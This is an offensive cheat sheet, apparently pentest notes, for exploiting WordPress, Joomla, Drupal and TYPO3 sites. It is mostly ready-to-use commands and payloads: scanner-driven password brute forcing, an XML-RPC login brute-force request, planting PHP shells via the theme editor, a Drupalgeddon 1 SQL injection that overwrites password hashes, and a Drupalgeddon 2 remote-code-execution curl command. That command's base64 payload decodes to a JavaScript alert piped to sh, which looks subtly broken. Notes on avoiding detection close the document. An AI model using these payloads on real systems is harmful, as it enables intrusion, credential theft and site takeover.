# cms exploitation. leverage platform-specific weaknesses.

common attack vectors:
- outdated plugins/themes with known cves
- default/weak admin credentials  
- insecure file upload functionality
- sql injection in plugins
- privilege escalation via misconfiguration

## wordpress

### reconnaissance
```bash
# wordpress scanner
wpscan --url http://target.com --enumerate ap,at,cb,dbe
wpscan --url http://target.com --passwords passwords.txt --usernames admin

# manual checks
curl http://target.com/wp-admin/
curl http://target.com/wp-content/plugins/
curl http://target.com/xmlrpc.php
```

### xmlrpc.php exploitation

test if enabled:
```xml
POST /xmlrpc.php
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

brute force login:
```xml
POST /xmlrpc.php 
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>password123</value></param>
</params>
</methodCall>
```

### common vulnerabilities

**plugin upload bypass:**
- vulnerable upload plugins often allow php execution
- check `/wp-content/uploads/` for accessible shells

**theme editor access:**
- if admin access gained, edit theme files for php shells
- `/wp-admin/theme-editor.php`

**wp-config.php exposure:**
- backup files: `wp-config.php~`, `wp-config.php.bak`
- contains database credentials

## joomla

### reconnaissance 
```bash
# joomla scanner  
joomscan -u http://target.com
joomscan -u http://target.com --enumerate-components

# version detection
curl http://target.com/administrator/manifests/files/joomla.xml
```

### common attack points

**administrator panel:**
- default path: `/administrator/`
- weak credentials often used

**configuration.php exposure:**
- contains database and secret keys
- check for backup versions

## drupal

### reconnaissance
```bash
# droopescan
droopescan scan drupal -u http://target.com

# manual version check  
curl http://target.com/CHANGELOG.txt
curl http://target.com/INSTALL.txt
```

### drupalgeddon exploits

**drupalgeddon 1 (cve-2014-3704):**
```sql
# sql injection in form api
POST /drupal/?q=node&destination=node
name[0;UPDATE users SET pass = '$S$CTo9G7Lx28rzCfpn16WZ4y05G4LLgfkMlxDZhTgFZjdS.r59RVqOz2';]=test&form_id=user_login_block&op=Log+in
```

**drupalgeddon 2 (cve-2018-7600):**
```bash
# rce via form api
curl -d "form_id=user_login_block&_triggering_element_name=name" \
     -d "_triggering_element_value=&op=Log+in" \
     -d "name[#post_render][]=exec&name[#type]=markup&name[#markup]=echo YWxlcnQoJ1hTUycpOw==|base64 -d|sh" \
     http://target.com/?q=user/password
```

## typo3

### reconnaissance
```bash
# version check
curl http://target.com/typo3conf/ENABLE_INSTALL_TOOL
curl http://target.com/typo3/install.php

# admin interface
curl http://target.com/typo3/
```

### attack vectors

**install tool abuse:**
- if accessible, can lead to full compromise
- path: `/typo3/install.php`

**extension vulnerabilities:**
- similar to wordpress plugins
- check typo3 security bulletins

## operational notes

- [!] cms scanners generate significant log entries - use carefully
- default admin paths are heavily monitored - expect detection
- always check for version-specific cves after fingerprinting
- backup and temp files often contain sensitive configuration data

# TODO: add detection evasion techniques for cms scanners